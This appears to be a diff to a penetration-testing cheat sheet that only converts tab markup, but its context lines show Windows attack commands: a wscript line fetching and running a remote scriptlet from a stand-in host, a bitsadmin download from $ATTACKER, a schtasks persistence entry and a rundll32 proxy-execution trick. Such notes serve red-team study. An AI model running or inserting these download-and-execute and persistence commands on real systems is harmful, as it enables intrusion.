@@ -634,14 +634,14 @@ cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/
 
 #### Wscript Script Code Download & Execution
 
-{% code-tabs %}
-{% code-tabs-item title="cmd" %}
+{% tabs %}
+{% tab title="cmd" %}
 ```text
 echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.js
 ```
-{% endcode-tabs-item %}
+{% endtab %}
 
-{% code-tabs-item title="code.js" %}
+{% tab title="code.js" %}
 ```markup
 <?xml version="1.0"?>
 <package>
@@ -654,8 +654,8 @@ echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.j
 </component>
 </package>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ### Whois Data Exfiltration
 
@@ -957,20 +957,20 @@ schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.e
 
 ### Ieframe.dll
 
-{% code-tabs %}
-{% code-tabs-item title="cmd" %}
+{% tabs %}
+{% tab title="cmd" %}
 ```text
 rundll32 c:\windows\system32\ieframe.dll,OpenURL c:\temp\test.url
 ```
-{% endcode-tabs-item %}
+{% endtab %}
 
-{% code-tabs-item title="test.url" %}
+{% tab title="test.url" %}
 ```
 [internetshortcut]
 url=c:\windows\system32\calc.exe
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 This was inspired by and forked/adapted/updated from [Dostoevsky's Pentest Notes](https://github.com/dostoevskylabs/dostoevsky-pentest-notes).
 
